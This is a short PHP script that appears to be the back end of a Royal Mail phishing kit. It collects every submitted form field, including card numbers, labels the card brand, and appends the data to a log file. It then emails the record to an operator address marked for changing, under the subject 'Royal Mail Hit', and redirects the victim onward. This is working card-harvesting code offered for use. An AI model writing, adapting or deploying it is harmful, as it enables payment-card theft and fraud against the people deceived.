<?php
require 'config.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') exit;

$data = $_POST;
$data['card_type'] = (strpos($data['card_number'] ?? '', '4') === 0) ? 'Visa' : 
                     (strpos($data['card_number'] ?? '', '5') === 0) ? 'Mastercard' : 'Unknown';

$log_entry = json_encode($data, JSON_PRETTY_PRINT) . "\n---\n";

file_put_contents($log_file, $log_entry, FILE_APPEND);

// Optional: Email alert
$to = "yourrealemail@gmail.com"; // ← CHANGE
$subject = "Royal Mail Hit - " . $data['postcode'];
mail($to, $subject, $log_entry);

header("Location: " . $forward_url);
exit;
?>